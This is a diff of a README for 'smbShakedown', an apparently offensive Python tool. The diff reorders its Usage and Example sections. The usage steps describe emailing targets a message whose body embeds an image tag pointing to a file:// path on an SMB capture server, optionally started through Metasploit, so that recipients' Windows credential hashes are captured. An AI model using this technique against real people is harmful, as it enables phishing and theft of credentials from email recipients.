@@ -7,8 +7,21 @@
     cd smbShakedown/
     python smbShakedown.py
     
+#Usage
+    1.Configure SMTP Server, smarthost/localhost/other:
+    (Looking into intergrating smtpd for local SMTP server option)
+    
+    2.Enter SMTP Server credentials: 
+    (anonymous connections not yet supported.)
+    
+    3.Configure "from" and "to" addresses:
+    
+    4.Enter SMBCapture Server IP address, so it can be placed in body of email:
+    EX: <img src=file://127.0.0.1/image/foo.gif>
+    
+    5. Choose whether or not to launch Metasploit's SMB Capture server.
+
 #Example
-        Launch smbShakedown.py and follow the wizard:
         
         Enter SMTP Server address[smtp.gmail.com]: 
         ENTERED: "smtp.gmail.com"
@@ -34,22 +47,9 @@
         ENTERED:Bob
         
         etc..
-#Usage
-    1.Configure SMTP Server, smarthost/localhost/other:
-    (Looking into intergrating smtpd for local SMTP server option)
-    
-    2.Enter SMTP Server credentials: 
-    (anonymous connections not yet supported.)
-    
-    3.Configure "from" and "to" addresses:
-    
-    4.Enter SMBCapture Server IP address, so it can be placed in body of email:
-    EX: <img src=file://127.0.0.1/image/foo.gif>
-    
-    5. Choose whether or not to launch Metasploit's SMB Capture server.
-    
+
 #To do:
     Multiple recipient address support.
     SMTP Anonymous Auth option
     Add error handling.
-    fork.
+
